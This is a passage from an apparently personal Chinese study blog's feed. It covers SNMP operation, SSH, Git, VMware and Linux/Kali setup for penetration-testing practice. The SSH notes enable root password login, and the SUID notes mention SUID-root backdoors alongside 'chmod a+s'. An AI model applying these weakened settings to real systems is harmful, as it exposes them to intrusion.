title="轮询(polling-only)"></a>轮询(polling-only)</h5><p>SNMP使用嵌入到网络设施中的代理软件来收集网络的通信信息和有关网络设备的统计数据。代理软件不断地收集统计数据，并把这些数据记录到一个管理信息库(MIB)中。网管员通过向代理的MIB发出查询信号可以得到这些信息，这个过程就叫轮询(polling)。为了能全面地查看一天的通信流量和变化率，管理人员必须不断地轮询SNMP代理，每分钟就轮询一次。这样，网管员可以使用SNMP来评价网络的运行状况，并揭示出通信的趋势，如哪一个网段接近通信负载的最大能力或正使通信出错等。先进的SNMP网管站甚至可以通过编程来自动关闭端口或采取其它矫正措施来处理历史的网络数据。</p><p>如果只是用轮询的方法，那么网络管理工作站总是在控制之下。但这种方法的缺陷在于信息的实时性，尤其是错误的实时性。多久轮询一次、轮询时选择什么样的设备顺序都会对轮询的结果产生影响。轮询的间隔太小，会产生太多不必要的通信量;间隔太大，而且轮询时顺序不对，那么关于一些大的灾难性事件的通知又会太慢，就违背了积极主动的网络管理目的。</p><h5 id="中断-interrupt-based"><a href="#中断-interrupt-based" class="headerlink" title="中断(interrupt-based)"></a>中断(interrupt-based)</h5><p>与之相比，当有异常事件发生时，基于中断的方法可以立即通知网络管理工作站，实时性很强。但这种方法也有缺陷。产生错误或自陷需要系统资源。如果自陷必须转发大量的信息，那么被管理设备可能不得不消耗更多的事件和系统资源来产生自陷，这将会影响到网络管理的主要功能。</p><p>结果，以上两种方法的结合：面向自陷的轮询方法(trap-directed polling)可能是执行网络管理最有效的方法了。一般来说，网络管理工作站轮询在被管理设备中的代理来收集数据，并且在控制台上用数字或图形的表示方法来显示这些数据。被管理设备中的代理可以在任何时候向网络管理工作站报告错误情况，而并不需要等到管理工作站为获得这些错误情况而轮询它的时候才会报告。</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>SNMP的体系结构分为SNMP管理者(SNMP Manager)和SNMP代理者(SNMP Agent)，每一个支持SNMP的网络设备中都包含一个代理，此代理随时纪录网络设备的各种情况，网络管理程序再通过SNMP通信协议查询或修改代理所纪录的信息。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181807013.jpeg" alt="img" style="zoom: 67%;" /><h4 id="SNMP报文类型"><a href="#SNMP报文类型" class="headerlink" title="SNMP报文类型"></a>SNMP报文类型</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191303735.png" alt="image-20220819130350603" style="zoom:50%;" /></blockquote><h4 id="SNMP工作方式"><a href="#SNMP工作方式" class="headerlink" title="SNMP工作方式"></a>SNMP工作方式</h4><p>两者之间是松耦合的关系，使用UDP协议进行通讯，默认端口是UDP161(也会用到162端口接收trap数据)</p><p>SNMP管理站通过向SNMP代理发送请求命令（GetRequest, GetNextRequest, GetBulkRequest或InformRequest），当SNMP代理收到命令后返回响应（Response）</p><p>SNMP管理站向SNMP代理发送SetRequest，代理设备执行设置操作。</p><p>SNMP代理发生特定重要状况改变时主动向SNMP管理站发送Trap消息。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182355091.jpeg" alt="img" style="zoom:67%;" /><h4 id="SNMP报文格式"><a href="#SNMP报文格式" class="headerlink" title="SNMP报文格式"></a>SNMP报文格式</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191312531.png" alt="image-20220819131242400" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191551496.png" alt="image-20220819155110379" style="zoom:50%;" /><p>注意：SNMP协议没有给出每个字段的长度，因为使用了TLV方式~，所以不需要给出。TLV自解释</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191555397.png" alt="image-20220819155523260" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191557873.png" alt="image-20220819155707700" style="zoom: 50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191605613.png" alt="image-20220819160502485" style="zoom:50%;" /><h4 id="SNMP编码"><a href="#SNMP编码" class="headerlink" title="SNMP编码"></a>SNMP编码</h4><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191607981.png" alt="image-20220819160722832" style="zoom:50%;" /></blockquote><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191610514.png" alt="image-20220819161035389"></p><p>在第三节的第26分钟解释，豁然开朗~~！<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191616105.png" alt="image-20220819161610865"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191644250.png" alt="image-20220819164443105"></p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>在SNMPv3中增加了以下安全特性：</p><ul><li>报文完整性：保证报文在传输中不被修改</li><li>可认证性：能够判断报文是不是一个有效的源发送的</li><li>加密：保证私密性，即使被截获无法得知发送的到底是什么</li><li>基于视图的访肉控制：</li></ul><blockquote><ul><li>SNMP实体维护着不同用户的访问权限，策略的数据库</li><li>是否可访问的LCD数据库可以作为被管对象访问</li></ul></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><a href="https://www.bilibili.com/video/BV1TL4y1B7LJ?spm_id_from=333.337.search-card.all.click&vd_source=e73a152dada4626bad49c30d848902f7">中科大-郑烇-计算机网络-网络管理（3&#x2F;3）-数据定义语言ASN.1、BER编码和SNMP协议</a></p><p><a href="https://product.pconline.com.cn/itbk/life/electronic/1802/10848758.html">网络管理协议是什么 各种网络管理协议特点介绍【详解】</a></p><p><a href="https://www.bilibili.com/video/BV1PY4y1s7cD?spm_id_from=333.337.search-card.all.click&vd_source=e73a152dada4626bad49c30d848902f7">SNMP操作演示</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络管理 </tag>
            
            <tag> SNMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/SSH/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/SSH/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h1><p>SSH简介：SSH 为 Secure Shell 的缩写，SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#SSH配置：开启密码登录、允许root用户登录：</span></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#PermitRootLogin prohibit-password</span></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开启或重启ssh：（改完配置文件都要重启相应服务）</span></span><br><span class="line">service ssh start</span><br><span class="line">service ssh restart</span><br><span class="line">systemctl status ssh<span class="comment">#命令查看ssh状态</span></span><br><span class="line">systemctl start ssh<span class="comment">#开启ssh服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看22端口是否开启监听：</span></span><br><span class="line">netstat -anltup | grep 22</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加开机启动：</span></span><br><span class="line">systemctl <span class="built_in">enable</span> ssh</span><br><span class="line">update-rc.d ssh <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#终端连接：</span></span><br><span class="line">ifconfig</span><br><span class="line">ssh root@192.168.123.136</span><br></pre></td></tr></table></figure><h1 id="ssh连接centos-很慢-解决方法"><a href="#ssh连接centos-很慢-解决方法" class="headerlink" title="ssh连接centos 很慢-解决方法"></a>ssh连接centos 很慢-解决方法</h1><blockquote><p>参考：<a href="https://www.runoob.com/w3cnote/ssh-slow.html">https://www.runoob.com/w3cnote/ssh-slow.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先备份/etc/ssh/sshd_config,备份命令为</span></span><br><span class="line"><span class="built_in">cp</span> /etc/ssh/sshd_config /etc/ssh/sshd_config.bak</span><br><span class="line"><span class="comment">#以root用户登录</span></span><br><span class="line"><span class="comment">#编辑配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config  </span><br><span class="line"><span class="comment">#输入 / ,查找GSSAPIAuthentication 其值改为no</span></span><br><span class="line"><span class="comment">#输入 /，查找UseDNS,其值改为no(该项默认不启用，去掉#启用)</span></span><br><span class="line"><span class="comment">#最后输入!wq保存文件并退出</span></span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure><h1 id="关于known-hosts文件"><a href="#关于known-hosts文件" class="headerlink" title="关于known_hosts文件:"></a>关于<strong>known_hosts</strong>文件:</h1><blockquote><p>用户的.ssh目录下面有有个<strong>known_hosts</strong>文件，这个文件存储本机曾经ssh连接过的远程主机的公钥，用来在连接时和对面主机上的公钥进行比对，如果一样则进行下一步操作！</p><p>ssh会把你每个你访问过计算机的公钥(public key)都记录在known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</p><p>参考：<a href="https://www.cnblogs.com/fonxian/p/11228760.html">https://www.cnblogs.com/fonxian/p/11228760.html</a></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208282147744.png" alt="image-20220827205707043" style="zoom:50%;" /></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
            <tag> ssh连接centos很慢 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Git/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Git/</url>
      
        <content type="html"><![CDATA[<p>Git简介：一个开源的分布式版本控制系，用于敏捷高效地处理任何或小或大的项目。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#克隆</span><br><span class="line">git clone https://github.com/Hack-with-Github/Awesome-Hacking.git</span><br><span class="line">#Git socks代理</span><br><span class="line">#前提是你本地有 socks5 代理，本地socks开启局域网连接</span><br><span class="line">git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git clone https://github.com/shmilylty/OneForAll.git</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li>Git教程:<a href="https://www.runoob.com/git/git-tutorial.html">https://www.runoob.com/git/git-tutorial.html</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmware使用</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/vmware%E4%BD%BF%E7%94%A8/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/vmware%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="vmware虚拟网卡的解释"><a href="#vmware虚拟网卡的解释" class="headerlink" title="vmware虚拟网卡的解释"></a>vmware虚拟网卡的解释</h1><p>为什么windows主机可以访问内网的网站呢，为什么可以ping通Ubuntu和win7呢，因为在VM里创建虚拟网卡的时候，在Windows上面也创建了虚拟网卡，通过<code>IPconfig /all</code>命令，可以看得到。如果不想让主机访问到内网，可以在设置里面禁用虚拟网卡或者设置防火墙：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181001851.png" alt="image-20220818095458787" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用基础</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&amp;Linux/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&amp;Linux/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h1><p>Kali Linux是基于debian的发行版。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180940750.png" alt="image-20220818094012557" style="zoom:50%;" /><h1 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h1><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180940707.png" alt="image-20220818094044556" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/：根目录，每一个文件和目录都从这里开始。只有root用户具有该目录下的写权限。</span><br><span class="line">/bin：用户二进制文件，包含二进制可执行文件。系统的所有用户使用的命令都设在这里，例如：ps，ls，ping，grep，cp等。</span><br><span class="line">/boot：这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。</span><br><span class="line">/dev ：设备文件，dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。</span><br><span class="line">/etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。</span><br><span class="line">/home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</span><br><span class="line">/lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。</span><br><span class="line">/opt：可选的附加应用程序，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库就可以放到这个目录下。默认是空的。</span><br><span class="line">/root：该目录为系统管理员，也称作超级权限者的用户主目录。</span><br><span class="line">/sbin：s就是Super User的意思，系统二进制文件，在这个目录下的linux命令通常由系统管理员使用。</span><br><span class="line">/usr：这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</span><br><span class="line">/usr/bin：系统用户使用的应用程序。</span><br><span class="line">/usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。</span><br><span class="line">/tmp：这个目录是用来存放一些临时文件的。</span><br><span class="line">/var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</span><br></pre></td></tr></table></figure><h1 id="Linux文件权限及属性"><a href="#Linux文件权限及属性" class="headerlink" title="Linux文件权限及属性"></a>Linux文件权限及属性</h1><h2 id="常用权限"><a href="#常用权限" class="headerlink" title="常用权限"></a>常用权限</h2><blockquote><p><a href="https://m.runoob.com/linux/linux-comm-chown.html">chown命令</a></p></blockquote><p>用ll命令列出来所有文件的权限，一般而言，你是什么用户创建的文件，其文件所属用户就对应于对应用户</p><p>Linux里面的权限控制及其细分，注意组的权限和个人权限，即使文件没有个人权限，如果所属组有权限，那么也是可以执行的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r：4</span><br><span class="line">w：2</span><br><span class="line">x：1</span><br><span class="line">属主：u（user）</span><br><span class="line">数组：g（group）</span><br><span class="line">其他：o（other）</span><br><span class="line"><span class="built_in">chmod</span> u+x <span class="built_in">test</span>                        <span class="comment">#chmod    change mode</span></span><br><span class="line"><span class="built_in">chown</span> root.root <span class="built_in">test</span>                  <span class="comment">#chown    change owner    root，root前面的是用户，后面的是组</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">    -rw-r--r--  1 kali kali 11759  2月 23 05:36 .face</span><br><span class="line">    lrwxrwxrwx  1 kali kali     5  2月 23 05:36 .face.icon -&gt; .face</span><br><span class="line">    drwx------  3 kali kali  4096  3月 31 06:00 .gnupg</span><br><span class="line">-开头表示这是一个文件</span><br><span class="line">l开头表示这是一个链接</span><br><span class="line">d开头表示这是一个目录</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180947778.png" alt="image-20220818094710630" style="zoom:50%;" /><h2 id="其他权限"><a href="#其他权限" class="headerlink" title="其他权限"></a>其他权限</h2><p>除了读写执行权限外系统还支持强制位（s权限）和粘滞位（t权限）</p><h3 id="s权限"><a href="#s权限" class="headerlink" title="s权限"></a><strong>s权限</strong></h3><h4 id="s权限简介："><a href="#s权限简介：" class="headerlink" title="s权限简介："></a>s权限简介：</h4><p>s即（SUID,Set UID）。设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份. 典型的文件是passwd. 如果一般用户执行该文件, 则在执行过程中, 该文件可以获得root权限, 从而可以更改用户的密码.</p><p>可执行的文件搭配这个权限，便能得到特权，任意存取该文件的所有者能使用的全部系统资源。请注意具备SUID权限的文件，黑客经常利用这种权限，以SUID配上root帐号拥有者，无声无息地在系统中开扇后门，供日后进出使用。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 pythontab pythontab 32988 2018-03-16 14:25 /usr/bin/passwd</span><br></pre></td></tr></table></figure><h4 id="设置s权限"><a href="#设置s权限" class="headerlink" title="设置s权限"></a>设置s权限</h4><ul><li>我们可以通过<strong>字符模式</strong>设置s权限</li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod a+s filename</span><br></pre></td></tr></table></figure></blockquote><ul><li>也可以使用<strong>绝对模式</strong>进行设置：</li></ul><blockquote><ul><li>设置suid：将相应的权限位之前的那一位设置为4；</li><li>设置guid：将相应的权限位之前的那一位设置为2；</li><li>两者都置位：将相应的权限位之前的那一位设置为4+2&#x3D;6。</li></ul></blockquote><p>注意：在设置s权限时文件属主、属组必须先设置相应的x权限，否则s权限并不能正真生效（chmode命令不进行必要的完整性检查，即使不设置x权限就设置s权限，chmod也不会报错，当我们ls -l时看到rwS，大写S说明s权限未生效）</p><h3 id="t权限"><a href="#t权限" class="headerlink" title="t权限"></a><strong>t权限</strong></h3><p>t权限：要删除一个文档，您不一定要有这个文档的写权限，但您一定要有这个文档的上级目录的写权限。也就是说，您即使没有一个文档的写权限，但您有这个文档的上级目录的写权限，也能够把这个文档给删除，而假如没有一个目录的写权限，也就不能在这个目录下创建文档。</p><p>怎样才能使一个目录既能够让任何用户写入文档，又不让用户删除这个目录下他人的文档，t权限就是能起到这个作用。t权限一般只用在目录上，用在文档上起不到什么作用。</p><p>在一个目录上设了t权限位后，（如&#x2F;home，权限为1777)任何的用户都能够在这个目录下创建文档，但只能删除自己创建的文档(root除外)，这就对任何用户能写的目录下的用户文档 启到了保护的作用。</p><p>可以通过chmod +t filename 来设置t权限</p><blockquote><p>注：&#x2F;tmp和 &#x2F;var&#x2F;tmp目录供所有用户暂时存取文件，亦即每位用户皆拥有完整的权限进入该目录，去浏览、删除和移动文件。</p></blockquote><h1 id="Kali配置"><a href="#Kali配置" class="headerlink" title="Kali配置"></a>Kali配置</h1><h2 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo su</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h2 id="linux网络配置文件详解-设置固定IP）"><a href="#linux网络配置文件详解-设置固定IP）" class="headerlink" title="linux网络配置文件详解(设置固定IP）"></a>linux网络配置文件详解(设置固定IP）</h2><p>如果不想通过DHCP随机分配ip地址（当IP租期一过就会重新分配），就需要通过修改网络配置文件，改为固定的IP，文件所在目录如下：</p><p>&#x3D;&#x3D;&gt;centos的网络配置文件在<code>/etc/sysconfig/network-scripts</code>目录下</p><blockquote><ul><li><p><a href="https://www.cnblogs.com/ArthurYu/p/13908934.html">https://www.cnblogs.com/ArthurYu/p/13908934.html</a></p></li><li><p><a href="https://blog.csdn.net/weixin_42476945/article/details/104164056">https://blog.csdn.net/weixin_42476945/article/details/104164056</a></p></li></ul></blockquote><p>&#x3D;&#x3D;&gt;ubuntu的网络配置文件在<code>/etc/network</code>目录下</p><blockquote><ul><li><a href="https://blog.csdn.net/qq_38880380/article/details/99442543#:~:text=Ubuntu%20%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%20%EF%BC%9A%20%E4%B8%80%E3%80%81linux%20%E7%BD%91%E7%BB%9C%20%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BD%A2%E5%BC%8F%20%E5%85%88%E7%AE%80%E5%8D%95%E8%AF%B4%E4%B8%8B%E7%BB%99Ubuntu%20%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C,%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%20%EF%BC%9A%201.%E8%BF%9B%E5%85%A5interfaces%20%E9%85%8D%E7%BD%AE%20sudo%20vi%20%2Fetc%2Fnetwork%2Finterfaces%202.">linux–ubuntu网络配置</a></li><li><a href="https://www.cnblogs.com/lshan/p/15787497.html">ubuntu20.04 修改　DNS 　ip</a></li></ul></blockquote><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置文件位置：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">1. DEVICE=eth0 网卡的名字</span><br><span class="line">2. HWADDR=00:0c:29:90:89:d9 HWADDR HardWare Address 硬件地址 MAC地址</span><br><span class="line">3. TYPE=Ethernet 网络类型 以太网</span><br><span class="line">4. UUID=ae779ae6-044d-43d5-a33b-48c89e8de10e #UUID 做到系统中独一无二。</span><br><span class="line">5. ONBOOT=yes BOOT ON ? 在开机或重启网卡的时候是否启动网卡</span><br><span class="line">6. NM_CONTROLLED=yes 是否受network程序管理</span><br><span class="line">7. BOOTPROTO=none 网卡是如何获取到ip地址 网卡获取ip地址的方式</span><br><span class="line">　　a. dhcp 自动获取ip地址</span><br><span class="line">　　b. none 固定的ip地址</span><br><span class="line">　　c. static 固定的ip地址</span><br><span class="line">8. IPADDR=10.0.0.100 IPADDR ip地址</span><br><span class="line">9. NETMASK=255.255.255.0 子网掩码 决定这个局域网中最多有多少台机器</span><br><span class="line">10. GATEWAY=10.0.0.2 网关 整个大楼的大门</span><br><span class="line">11. USERCTL=no 普通用户是否能控制网卡</span><br><span class="line">12. /etc/resolv.conf 配置DNS 网卡配置文件的DNS优先于/etc/resolv.conf</span><br><span class="line">13. DNS 域名解析器 阿里的域名解析器：223.5.5.5 223.6.6.6</span><br><span class="line"></span><br><span class="line">重启网卡命令： /etc/init.d/network restart</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">HWADDR=00:0c:29:2d:d7:44</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">IPADDR=192.168.22.11</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.22.1</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens37</span><br><span class="line">UUID=a18a03de-36a2-36a2-8514-0232129b08b0</span><br><span class="line">ONBOOT=yes</span><br><span class="line">AUTOCONNECT_PRIORITY=-999</span><br></pre></td></tr></table></figure><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看自己的网卡编号</span></span><br><span class="line">ip a</span><br><span class="line"><span class="comment">#配置网卡静态或者动态IP：</span></span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line"><span class="comment">#配置DNS：</span></span><br><span class="line">vim /etc/resolv.conf</span><br><span class="line">vim /etc/systemd/resolved.conf</span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">service networking restart</span><br><span class="line">service network-manager restart</span><br><span class="line"><span class="comment">#自动获取IP(在固定IP模式下不生效）：</span></span><br><span class="line">dhclient</span><br><span class="line"><span class="comment">#启动网卡:</span></span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#配置静态IP：/etc/network/interfaces</span><br><span class="line">auto lo  # lo接口会在系统启动时自动配置</span><br><span class="line">iface lo inet loopback  # 将lo接口设置为一个本地回环(loopback)地址</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.228</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line"></span><br><span class="line"># 动态获取IP配置方法：</span><br><span class="line">auto ens33  # ens33接口会在系统启动时自动配置</span><br><span class="line">iface ens33 inet dhcp</span><br></pre></td></tr></table></figure><h4 id="Ubuntu20-04-LTS版本修改DNS"><a href="#Ubuntu20-04-LTS版本修改DNS" class="headerlink" title="Ubuntu20.04 LTS版本修改DNS"></a><strong>Ubuntu20.04 LTS版本修改DNS</strong></h4><p>修改 &#x2F;etc&#x2F;systemd&#x2F;resolved.conf 文件，在其中添加dns信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/systemd/resolved.conf</span><br><span class="line">DNS=114.114.114.114 192.168.10.213 192.168.22.1 192.168.33.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#可提供的DNS服务器</span></span><br><span class="line">nameserver 223.5.5.5</span><br><span class="line">nameserver 192.168.10.213</span><br><span class="line">nameserver 192.168.22.1</span><br><span class="line">nameserver 192.168.33.1</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure><p>在ubuntu终端中依次执行如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart systemd-resolved</span><br><span class="line">systemctl <span class="built_in">enable</span> systemd-resolved</span><br><span class="line"><span class="built_in">mv</span> /etc/resolv.conf /etc/resolv.conf.bak</span><br><span class="line"><span class="built_in">ln</span> -s /run/systemd/resolve/resolv.conf /etc/</span><br><span class="line"><span class="comment">#原本所谓的/etc/resolv.conf文件就是指向/run/systemd/resolve/resolv.conf的软链接</span></span><br></pre></td></tr></table></figure><p>再查看<code>cat /etc/resolv.conf</code>文件就可以看到新的dns信息已经写入其中了。</p><p>最后重启NetworkManager：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart NetworkManager</span><br></pre></td></tr></table></figure><h2 id="设置APT源"><a href="#设置APT源" class="headerlink" title="设置APT源"></a>设置APT源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">vim /etc/apt/sources.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get clean</span><br><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h2 id="APT使用"><a href="#APT使用" class="headerlink" title="APT使用"></a>APT使用</h2><h3 id="apt-get-amp-apt"><a href="#apt-get-amp-apt" class="headerlink" title="apt-get &amp; apt"></a>apt-get &amp; apt</h3><p>apt-get  可以从认证软件源下载软件包及相关信息，以便安装和升级软件包，或者用于移除软件包。在这些过程中，软件包依赖会被妥善处理。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update - 取回更新的软件包列表信息</span><br><span class="line">upgrade - 进行一次升级</span><br><span class="line">install - 安装新的软件包(注：软件包名称是 libc6 而非libc6.deb)</span><br><span class="line">reinstall - Reinstall packages (pkg is libc6 not libc6.deb)</span><br><span class="line">remove - 卸载软件包</span><br></pre></td></tr></table></figure><h3 id="apt-与-apt-get的区别与解释"><a href="#apt-与-apt-get的区别与解释" class="headerlink" title="apt 与 apt-get的区别与解释"></a>apt 与 apt-get的区别与解释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单来说就是：apt = apt-get、apt-cache 和 apt-config 